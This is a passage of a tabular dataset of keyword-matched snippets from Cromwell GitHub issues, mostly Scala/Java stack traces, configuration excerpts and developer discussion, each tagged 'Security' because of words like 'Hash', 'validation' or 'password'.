cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.$anonfun$buildWorkflowDescriptor$7(MaterializeWorkflowDescriptorActor.scala:242); cats.data.EitherT.$anonfun$flatMap$1(EitherT.scala:80); cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:138); cats.effect.internals.IORunLoop$.start(IORunLoop.scala:35); cats.effect.IO.unsafeRunAsync(IO.scala:269); cats.effect.IO.unsafeToFuture(IO.scala:341); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.$anonfun$applyOrElse$1(MaterializeWorkflowDescriptorActor.scala:146); scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:303); scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); scala.concurrent.impl.CallbackRunnable.run(Prom,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6999:11325,validat,validateNamespace,11325,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6999,1,['validat'],['validateNamespace']
Security,anonfun$fetchLocallyQualifiedInputs$1.apply(WorkflowActor.scala:962) ~[cromwell.jar:0.19]; at scala.util.Try$.apply(Try.scala:192) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowActor.fetchLocallyQualifiedInputs(WorkflowActor.scala:962) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowActor.cromwell$engine$workflow$WorkflowActor$$processRunnableCall(WorkflowActor.scala:1254) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowActor$$anonfun$33.apply(WorkflowActor.scala:868) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowActor$$anonfun$33.apply(WorkflowActor.scala:867) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.immutable.HashMap$HashMap1.foreach(HashMap.scala:221) ~[cromwell.jar:0.19]; at scala.collection.immutable.HashMap$HashTrieMap.foreach(HashMap.scala:428) ~[cromwell.jar:0.19]; at scala.collection.immutable.HashMap$HashTrieMap.foreach(HashMap.scala:428) ~[cromwell.jar:0.19]; at scala.collection.immutable.HashMap$HashTrieMap.foreach(HashMap.scala:428) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$class.map(TraversableLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.AbstractTraversable.map(Traversable.scala:104) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowActor.cromwell$engine$workflow$WorkflowActor$$startRunnableCalls(WorkflowActor.scala:867) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowActor$$anonfun$2.applyOrElse(WorkflowActor.scala:532) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowActor$$anonfun$2.applyOrElse(WorkflowActor.scala:467) ~[cromwell.jar:0.19]; at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:36) ~[cromwell.jar:0.19]; at akka.actor.FSM$class.processEvent(FSM.scala:604) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/695:5797,Hash,HashMap,5797,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/695,1,['Hash'],['HashMap']
Security,"ant this to plug into AWS"" or ""I want this to plug into Kubernetes,"" etc. The backends for HPC are going to be good to go with just a SLURM or SGE backend, and then commands to load and run/exec a Singularity container. When the time comes and Singularity supports services, then we can start to develop (I think) the singularity backend configuration for cromwell, with clean commands to get statuses, start and stop, and otherwise integrate into the software. You guys seem pretty busy, so likely your best bet would be to just wait, because the community is going in that direction anyway. The other representation is to rethink this. An approach that I like is to move away from micro managing the workflow / software, and to set requirements for the data. If you set standard formats (meaning everything from the organization of files down to the headers of a data file) on the data itself, then the software gets built around that. A researcher can have confidence that the data he is collecting will work with software because it's validated to the format. The developers can have confidence their tools will work with data because of that same format. A new graduate student knows how to develop a new tool because there are nicely defined rules. A good example is to look at the BIDS (brain imaging data structure) that (has several file formats under it) but it revolutionizing how brain imaging analysis is done. (e.g, take a look at [https://www.openneuro.org](https://www.openneuro.org). # Development of my Thinking; Finally, I want to share how I came to the thinking above. Here are the steps that I've taken in the last few weeks, and resulting thoughts from them. I started with this issue board actually, and a general goal to ""Add Singularity to Cromwell."" Ok. ### Question 1: How do I develop Cromwell?; It first was hard for me to know where to start to develop Cromwell, because the docs just went into how to compile it on a host. So it made sense to make it easy for the deve",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-416418214:6889,validat,validated,6889,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-416418214,2,['validat'],['validated']
Security,aphPrint$.upstreamPortToRelevantNodes$1(GraphPrint.scala:187); 	at wom.views.GraphPrint$.$anonfun$upstreamLinks$1(GraphPrint.scala:190); 	at scala.collection.TraversableLike.$anonfun$flatMap$1(TraversableLike.scala:245); 	at scala.collection.immutable.Set$Set1.foreach(Set.scala:97); 	at scala.collection.TraversableLike.flatMap(TraversableLike.scala:245); 	at scala.collection.TraversableLike.flatMap$(TraversableLike.scala:242); 	at scala.collection.AbstractTraversable.flatMap(Traversable.scala:108); 	at wom.views.GraphPrint$.upstreamLinksforNode$1(GraphPrint.scala:190); 	at wom.views.GraphPrint$.relevantAsUpstream$1(GraphPrint.scala:176); 	at wom.views.GraphPrint$.upstreamPortToRelevantNodes$1(GraphPrint.scala:187); 	at wom.views.GraphPrint$.$anonfun$upstreamLinks$1(GraphPrint.scala:190); 	at scala.collection.TraversableLike.$anonfun$flatMap$1(TraversableLike.scala:245); 	at scala.collection.immutable.HashSet$HashSet1.foreach(HashSet.scala:321); 	at scala.collection.immutable.HashSet$HashTrieSet.foreach(HashSet.scala:977); 	at scala.collection.TraversableLike.flatMap(TraversableLike.scala:245); 	at scala.collection.TraversableLike.flatMap$(TraversableLike.scala:242); 	at scala.collection.AbstractTraversable.flatMap(Traversable.scala:108); 	at wom.views.GraphPrint$.upstreamLinksforNode$1(GraphPrint.scala:190); 	at wom.views.GraphPrint$.upstreamLinks(GraphPrint.scala:191); 	at wom.views.GraphPrint.$anonfun$listAllGraphNodes$2(GraphPrint.scala:33); 	at scala.collection.Iterator$$anon$10.next(Iterator.scala:459); 	at scala.collection.Iterator.foreach(Iterator.scala:941); 	at scala.collection.Iterator.foreach$(Iterator.scala:941); 	at scala.collection.AbstractIterator.foreach(Iterator.scala:1429); 	at scala.collection.TraversableOnce.foldLeft(TraversableOnce.scala:160); 	at scala.collection.TraversableOnce.foldLeft$(TraversableOnce.scala:158); 	at scala.collection.AbstractIterator.foldLeft(Iterator.scala:1429); 	at cats.kernel.Monoid.combineAll(Monoid.scala:82); 	at cats.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6744:3506,Hash,HashSet,3506,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6744,2,['Hash'],"['HashSet', 'HashTrieSet']"
Security,ar:0.19]; at scala.util.Try$.apply(Try.scala:192) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowActor.fetchLocallyQualifiedInputs(WorkflowActor.scala:962) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowActor.cromwell$engine$workflow$WorkflowActor$$processRunnableCall(WorkflowActor.scala:1254) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowActor$$anonfun$33.apply(WorkflowActor.scala:868) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowActor$$anonfun$33.apply(WorkflowActor.scala:867) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.immutable.HashMap$HashMap1.foreach(HashMap.scala:221) ~[cromwell.jar:0.19]; at scala.collection.immutable.HashMap$HashTrieMap.foreach(HashMap.scala:428) ~[cromwell.jar:0.19]; at scala.collection.immutable.HashMap$HashTrieMap.foreach(HashMap.scala:428) ~[cromwell.jar:0.19]; at scala.collection.immutable.HashMap$HashTrieMap.foreach(HashMap.scala:428) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$class.map(TraversableLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.AbstractTraversable.map(Traversable.scala:104) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowActor.cromwell$engine$workflow$WorkflowActor$$startRunnableCalls(WorkflowActor.scala:867) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowActor$$anonfun$2.applyOrElse(WorkflowActor.scala:532) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowActor$$anonfun$2.applyOrElse(WorkflowActor.scala:467) ~[cromwell.jar:0.19]; at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:36) ~[cromwell.jar:0.19]; at akka.actor.FSM$class.processEvent(FSM.scala:604) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowActor.akka$actor$LoggingFSM$$super$processEvent(WorkflowActor.scala:236) ,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/695:5868,Hash,HashMap,5868,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/695,2,['Hash'],"['HashMap', 'HashTrieMap']"
Security,"arget/scala-2.12/cromwell-40-aa86539-SNAP.jar) to field sun.nio.ch.FileChannelImpl.fd; WARNING: Illegal reflective access by jnr.posix.JavaLibCHelper (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to field java.io.FileDescriptor.fd; WARNING: Illegal reflective access by org.python.netty.util.internal.ReflectionUtil (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to constructor java.nio.DirectByteBuffer(long,int); WARNING: Illegal reflective access by org.python.netty.util.internal.ReflectionUtil (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to method java.nio.Bits.unaligned(); WARNING: Illegal reflective access by org.python.netty.util.internal.ReflectionUtil (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to field sun.nio.ch.SelectorImpl.selectedKeys; WARNING: Illegal reflective access by org.python.netty.util.internal.ReflectionUtil (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to field sun.nio.ch.SelectorImpl.publicSelectedKeys; [2019-04-18 17:19:50,24] [info] Pre Processing Inputs...; Exception in thread ""MainThread"" cromwell.CromwellEntryPoint$$anon$1: ERROR: Unable to submit workflow to Cromwell::; Cannot find a tool or workflow with ID 'None' in file file:///home/jeremiah/fail_cromwell/test_wf_pack.cwl's set: [file:///home/jeremiah/fail_cromwell/test_wf_pack.cwl#main, file:///home/jeremiah/fail_cromwell/test_wf_pack.cwl#touch.cwl]; 	at cromwell.CromwellEntryPoint$.$anonfun$validOrFailSubmission$1(CromwellEntryPoint.scala:255); 	at cats.data.Validated.valueOr(Validated.scala:48); 	at cromwell.CromwellEntryPoint$.validOrFailSubmission(CromwellEntryPoint.scala:255); 	at cromwell.CromwellEntryPoint$.validateRunArguments(CromwellEntryPoint.scala:251); 	at cromwell.CromwellEntryPoint$.runSi",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-484714416:2854,access,access,2854,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-484714416,1,['access'],['access']
Security,"ask; # the associated WorkflowActor to abort again.; cache {; enabled: true; # Guava cache concurrency.; concurrency: 1; # How long entries in the cache should live from the time they are added to the cache.; ttl: 20 minutes; # Maximum number of entries in the cache.; size: 100000; }; }. # Cromwell reads this value into the JVM's `networkaddress.cache.ttl` setting to control DNS cache expiration; dns-cache-ttl: 3 minutes; }. docker {; hash-lookup {; # Set this to match your available quota against the Google Container Engine API; #gcr-api-queries-per-100-seconds = 1000. # Time in minutes before an entry expires from the docker hashes cache and needs to be fetched again; #cache-entry-ttl = ""20 minutes"". # Maximum number of elements to be kept in the cache. If the limit is reached, old elements will be removed from the cache; #cache-size = 200. # How should docker hashes be looked up. Possible values are ""local"" and ""remote""; # ""local"": Lookup hashes on the local docker daemon using the cli; # ""remote"": Lookup hashes on docker hub, gcr, gar, quay; #method = ""remote""; enabled = ""false""; }; }. # Here is where you can define the backend providers that Cromwell understands.; # The default is a local provider.; # To add additional backend providers, you should copy paste additional backends; # of interest that you can find in the cromwell.example.backends folder; # folder at https://www.github.com/broadinstitute/cromwell; # Other backend providers include SGE, SLURM, Docker, udocker, Singularity. etc.; # Don't forget you will need to customize them for your particular use case.; backend {; # Override the default backend.; default = slurm. # The list of providers.; providers {; # Copy paste the contents of a backend provider in this section; # Examples in cromwell.example.backends include:; # LocalExample: What you should use if you want to define a new backend provider; # AWS: Amazon Web Services; # BCS: Alibaba Cloud Batch Compute; # TES: protocol defined by GA4GH; # TESK:",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6933:4515,hash,hashes,4515,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6933,2,['hash'],['hashes']
Security,askInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: javax.net.ssl.SSLHandshakeException: Remote host closed connection during handshake; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:980); at sun.security.ssl.SSLSocketImpl.performInitialHandshake(SSLSocketImpl.java:1363); at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1391); at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1375); at sun.net.www.protocol.https.HttpsClient.afterConnect(HttpsClient.java:563); at sun.net.www.protocol.https.AbstractDelegateHttpsURLConnection.connect(AbstractDelegateHttpsURLConnection.java:185); at sun.net.www.protocol.https.HttpsURLConnectionImpl.connect(HttpsURLConnectionImpl.java:153); at com.google.api.client.http.javanet.NetHttpRequest.execute(NetHttpRequest.java:93); at com.google.api.client.http.HttpRequest.execute(HttpRequest.java:981); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:419); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:352); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:469); at com.google.cloud.storage.spi.DefaultStorageRpc.get(DefaultStorageRpc.java:320); ... 31 more; Caused by: java.io.EOFException: SSL peer shut down incorrectly; at sun.security.ssl.InputRecord.read(InputRecord.java:505); at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:961); ... 43 more```,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1782:5316,secur,security,5316,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1782,2,['secur'],['security']
Security,"aste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->; I am running Cromwell on GCP, launching a workflow that shards into ~5,000 pieces. I am getting the following error: `cromwell-system-akka.dispatchers.backend-dispatcher-150 ERROR - Read timed out`. ```; 2019-04-29 00:02:13,419 cromwell-system-akka.dispatchers.backend-dispatcher-139 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(95b34a77)vcf2bigquery.convertVCF:2058:1]: Status chang; e from Running to Success; 2019-04-29 00:02:24,760 cromwell-system-akka.dispatchers.backend-dispatcher-150 ERROR - Read timed out; java.net.SocketTimeoutException: Read timed out; at java.net.SocketInputStream.socketRead0(Native Method); at java.net.SocketInputStream.socketRead(SocketInputStream.java:116); at java.net.SocketInputStream.read(SocketInputStream.java:171); at java.net.SocketInputStream.read(SocketInputStream.java:141); at sun.security.ssl.InputRecord.readFully(InputRecord.java:465); at sun.security.ssl.InputRecord.read(InputRecord.java:503); at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:975); at sun.security.ssl.SSLSocketImpl.readDataRecord(SSLSocketImpl.java:933); at sun.security.ssl.AppInputStream.read(AppInputStream.java:105); at java.io.BufferedInputStream.fill(BufferedInputStream.java:246); at java.io.BufferedInputStream.read1(BufferedInputStream.java:286); at java.io.BufferedInputStream.read(BufferedInputStream.java:345); at sun.net.www.http.HttpClient.parseHTTPHeader(HttpClient.java:735); at sun.net.www.http.HttpClient.parseHTTP(HttpClient.java:678); at sun.net.www.protocol.http.HttpURLConnection.getInputStream0(HttpURLConnection.java:1587); at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1492); at java.net.HttpURLConnection.getResponseCode(HttpURLConnection.java:480); at sun.net.www.protocol.https.HttpsURLConnectionImpl.getResponseCode(HttpsURLConnec",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4914:1645,secur,security,1645,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4914,1,['secur'],['security']
Security,at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:521); 	at akka.actor.ActorCell.systemInvoke(ActorCell.scala:545); 	at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:283); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:235); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: cromwell.backend.validation.ValidatedRuntimeAttributesBuilder$$anon$1: Runtime attribute validation failed:; Expecting cpu runtime attribute value greater than 0; Expecting cpuMin runtime attribute value greater than 0; 	at cromwell.backend.validation.ValidatedRuntimeAttributesBuilder.build(ValidatedRuntimeAttributesBuilder.scala:62); 	at cromwell.backend.validation.ValidatedRuntimeAttributesBuilder.build$(ValidatedRuntimeAttributesBuilder.scala:56); 	at cromwell.backend.standard.StandardValidatedRuntimeAttributesBuilder$StandardValidatedRuntimeAttributesBuilderImpl.build(StandardValidatedRuntimeAttributesBuilder.scala:20); 	at cromwell.backend.standard.StandardCachingActorHelper.validatedRuntimeAttributes(StandardCachingActorHelper.scala:56); 	at cromwell.backend.standard.StandardCachingActorHelper.validatedRuntimeAttributes$(StandardCachingActorHelper.scala:54); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.validatedRuntimeAttributes$lzycompute(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.validatedRuntimeAttributes(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.standard.StandardCachingActorHelper.startMetadataKeyValues(StandardCachingActorHelper.scala:75); 	at cromwell.backend.standard.StandardCachingActorHelper.startMetadataKeyValues$(StandardCac,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4591:6125,Validat,ValidatedRuntimeAttributesBuilder,6125,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4591,1,['Validat'],['ValidatedRuntimeAttributesBuilder']
Security,"at code belonged here or in a separate repo). This is advantageous to just using it as a _monitoring_script_, because it removes all assumptions on the ""user"" Docker image (for the task itself). For example, we don't have to assume a particular distribution or presence of Python and its libraries. So it should work exactly the same for any task. Per @geoffjentry's suggestion, we've [consulted](https://groups.google.com/forum/#!topic/google-genomics-discuss/caYM7oHbfx0) with the Google Genomics team, and they don't see any apparent issues with the concept. We could expose this as a workflow option like `monitoring_image`, and allow configuring it at the Cromwell level, so e.g. any user of Terra (or any other hosted Cromwell with PAPIv2 backend) could get usage reports without having to configure anything. The metrics are reported in their GCP project, so a user gets automatic access to them as long as they're a viewer. We could also easily expose a link to workflow- and task-level reports in Job Manager UI, so they will be literally point-and-click away. Each timepoint is designed to be self-sufficient, as it is labeled with:; - Cromwell-specific values, such as workflow ID, task call name, index and attempt.; - GCP instance values such as instance name, zone, number of CPU cores, total memory and disk size. Here's an example graph of cpu/memory/disk utilization for one of our production workflows, as it is running right now - one can already see we could probably save ~40% of the cost:; <img width=""1869"" alt=""screen shot 2019-01-02 at 4 43 20 pm"" src=""https://user-images.githubusercontent.com/137337/50614108-c0e6e800-0ead-11e9-9ef4-02029725a44c.png"">. Reporting itself costs very little if anything at all, because Stackdriver provides a generous free tier worth ~65K instance-hours each month, and ~$0.0006 per instance-hour after that (at the current rate of 5 metric points reported each minute). @kshakir suggested using a ""vendor-neutral"" reporting library such as [M",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4510:2595,expose,expose,2595,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4510,1,['expose'],['expose']
Security,"at is specified for the task is in a private repo to which the Centaur service account has been granted access. This test passes on PAPI v2 but on GCP Batch jobs fail with messages like the following visible in `gcloud batch jobs describe`:. ```; Job state is set from RUNNING to FAILED for job projects/1005074806481/locations/us-central1/jobs/job-27607753-d2d5-404d-89af-a786da8ad383.Job; failed due to task failure. Specifically, task with index 0 failed due to the; following task event: ""Task state is updated from RUNNING to FAILED on zones/us-central1-b/instances/8098872438472929780; with exit code 125."". ```. Exit code 125 being a typical ""[something's wrong with that Docker invocation](https://stackoverflow.com/questions/53640424/exit-code-125-from-docker-when-trying-to-run-container-programmatically)"" error. in Cloud Logging I see the following, including what looks like a plaintext password which I have x'd out below:. ```; Executing runnable container:{image_uri:""broadinstitute/cloud-cromwell@sha256:0d51f90e1dd6a449d4587004c945e43f2a7bbf615151308cff40c15998cc3ad4"" commands:""/mnt/disks/cromwell_root/script"" entrypoint:""/bin/bash"" volumes:""/mnt/disks/cromwell_root:/mnt/disks/cromwell_root"" username:""firecloud"" password:""xxxxx""} labels:{key:""tag"" value:""UserRunnable""} for Task task/job-27607753-d2d5-132dc052-df92-4db100-group0-0/0/0 in TaskGroup group0 of Job job-27607753-d2d5-132dc052-df92-4db100.; ```. So it looks like the GCP Batch backend has acquired and plumbed through the required Docker credentials, but the login to Docker Hub doesn't seem to have happened. ### Release Notes Confirmation. #### `CHANGELOG.md`; - [ ] I updated `CHANGELOG.md` in this PR; - [x] I assert that this change shouldn't be included in `CHANGELOG.md` because it doesn't impact community users. #### Terra Release Notes; - [ ] I added a suggested release notes entry in this Jira ticket; - [x] I assert that this change doesn't need Jira release notes because it doesn't impact Terra users",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7515:1617,password,password,1617,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7515,1,['password'],['password']
Security,at scala.collection.MapLike$MappedValues.foreach(MapLike.scala:253); 	at cwl.internal.EcmaScriptUtil$.$anonfun$evalStructish$1(EcmaScriptUtil.scala:107); 	at cwl.internal.EcmaScriptUtil$.$anonfun$evalStructish$1$adapted(EcmaScriptUtil.scala:97); 	at cwl.internal.EnhancedRhinoSandbox.eval(EnhancedRhinoSandbox.scala:61); 	at cwl.internal.EcmaScriptUtil$.evalRaw(EcmaScriptUtil.scala:69); 	at cwl.internal.EcmaScriptUtil$.evalStructish(EcmaScriptUtil.scala:97); 	at cwl.ExpressionEvaluator$.eval(ExpressionEvaluator.scala:76); 	at cwl.ExpressionEvaluator$.evaluator$1(ExpressionEvaluator.scala:40); 	at cwl.ExpressionEvaluator$.$anonfun$evalExpression$1(ExpressionEvaluator.scala:43); 	at cwl.ExpressionInterpolator$.interpolate(ExpressionInterpolator.scala:140); 	at cwl.ExpressionEvaluator$.evalExpression(ExpressionEvaluator.scala:43); 	at cwl.EvaluateExpression$.$anonfun$script$2(EvaluateExpression.scala:11); 	at cwl.ExpressionEvaluator$.eval(ExpressionEvaluator.scala:35); 	at cwl.CommandLineBindingCommandPart.$anonfun$instantiate$5(CwlExpressionCommandPart.scala:79); 	at scala.Option.flatMap(Option.scala:171); 	at cwl.CommandLineBindingCommandPart.instantiate(CwlExpressionCommandPart.scala:78); 	at wom.callable.CommandTaskDefinition.$anonfun$instantiateCommand$3(CommandTaskDefinition.scala:109); 	at scala.collection.immutable.List.flatMap(List.scala:335); 	at wom.callable.CommandTaskDefinition.instantiateCommand(CommandTaskDefinition.scala:108); 	at wom.callable.CommandTaskDefinition.instantiateCommand$(CommandTaskDefinition.scala:97); 	at wom.callable.CallableTaskDefinition.instantiateCommand(CommandTaskDefinition.scala:136); 	at cromwell.backend.wdl.Command$.$anonfun$instantiate$1(Command.scala:32); 	at common.validation.ErrorOr$ShortCircuitingFlatMap$.flatMap$extension(ErrorOr.scala:20); 	at cromwell.backend.wdl.Command$.instantiate(Command.scala:31); 	at cromwell.backend.standard.StandardAsyncExecutionActor.instantiatedCommand(StandardAsyncExecutionActor.scala:349); ```,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3012#issuecomment-377570787:4171,validat,validation,4171,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3012#issuecomment-377570787,1,['validat'],['validation']
Security,atch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91\; ); at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72); at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.net.SocketException: Socket is closed; at sun.security.ssl.SSLSocketImpl.getInputStream(SSLSocketImpl.java:2218); at sun.net.www.http.HttpClient.parseHTTP(HttpClient.java:642); at sun.net.www.protocol.http.HttpURLConnection.getInputStream0(HttpURLConnection.java:1536); at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1441); at java.net.HttpURLConnection.getResponseCode(HttpURLConnection.java:480); at sun.net.www.protocol.https.HttpsURLConnectionImpl.getResponseCode(HttpsURLConnectionImpl.java:338); at com.google.api.client.http.javanet.NetHttpResponse.<init>(NetHttpResponse.java:37); at com.google.api.client.http.javanet.NetHttpRequest.execute(NetHttpRequest.java:94); at com.google.api.client.http.HttpRequest.execute(HttpRequest.java:981); at com.google.cloud.storage.spi.DefaultStorageRpc.open(DefaultStorageRpc.java:563); at com.google.cloud.storage.BlobWriteChannel.<init>(BlobWriteChannel.java:36); at com.google.cloud.storage.StorageImpl.writer(StorageImpl.java:476); at com.google.cloud.storage.Stor,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2009:2650,secur,security,2650,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2009,1,['secur'],['security']
Security,"atchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: common.exception.AggregatedMessageException: Error(s):; Could not evaluate expression: ""-l h_vmem="" + memory + ""G"": Cannot perform operation: -l h_vmem= + WomLong(4); at 